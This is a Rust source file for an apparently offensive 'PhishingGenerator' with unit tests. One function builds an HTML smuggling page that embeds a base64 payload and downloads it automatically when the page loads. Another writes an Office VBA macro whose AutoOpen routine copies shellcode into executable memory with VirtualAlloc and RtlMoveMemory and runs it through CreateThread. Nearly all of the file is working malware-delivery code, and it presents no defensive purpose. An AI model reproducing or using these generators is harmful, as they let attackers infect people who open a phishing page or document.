use base64::{Engine as _, engine::general_purpose};

pub struct PhishingGenerator;

impl PhishingGenerator {
    pub fn generate_html_smuggling(payload: &[u8], filename: &str) -> String {
        let b64 = general_purpose::STANDARD.encode(payload);
        // Basic HTML Smuggling template
        format!(
            r###"<!DOCTYPE html>
<html>
<head><title>Document</title></head>
<body>
<p>Loading...</p>
<script>
    function base64ToArrayBuffer(base64) {{
        var binary_string = window.atob(base64);
        var len = binary_string.length;
        var bytes = new Uint8Array(len);
        for (var i = 0; i < len; i++) {{
            bytes[i] = binary_string.charCodeAt(i);
        }}
        return bytes.buffer;
    }}
    
    var file = "{}";
    var data = base64ToArrayBuffer("{}");
    var blob = new Blob([data], {{type: "application/octet-stream"}});
    var fileName = file;
    
    if (window.navigator.msSaveOrOpenBlob) {{
        window.navigator.msSaveOrOpenBlob(blob, fileName);
    }} else {{
        var a = document.createElement("a");
        document.body.appendChild(a);
        a.style = "display: none";
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
    }}
</script>
</body>
</html>"###,
            filename, b64
        )
    }

    pub fn generate_macro_vba(payload: &[u8]) -> String {
        let mut vba = String::from(
            r#"
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr

Sub AutoOpen()
"#,
        );
        vba.push_str("    Dim code() As Byte\n");
        vba.push_str(&format!("    ReDim code({})\n", payload.len() - 1));

        // Chunk bytes to avoid huge lines
        for (i, byte) in payload.iter().enumerate() {
            vba.push_str(&format!("    code({}) = {}\n", i, byte));
        }

        vba.push_str(
            r#"
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(code) + 1, &H1000, &H40)
    RtlMoveMemory addr, code(0), UBound(code) + 1
    CreateThread 0, 0, addr, 0, 0, 0
End Sub
"#,
        );
        vba
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_html_smuggling_generation() {
        let payload = b"test payload";
        let html = PhishingGenerator::generate_html_smuggling(payload, "test.exe");
        assert!(html.contains("test.exe"));
        // Base64 of "test payload" is "dGVzdCBwYXlsb2Fk"
        assert!(html.contains("dGVzdCBwYXlsb2Fk"));
    }

    #[test]
    fn test_macro_vba_generation() {
        let payload = b"\x90\x90";
        let vba = PhishingGenerator::generate_macro_vba(payload);
        assert!(vba.contains("VirtualAlloc"));
        assert!(vba.contains("CreateThread"));
        // 0x90 = 144
        assert!(vba.contains("code(0) = 144"));
        assert!(vba.contains("code(1) = 144"));
    }
}
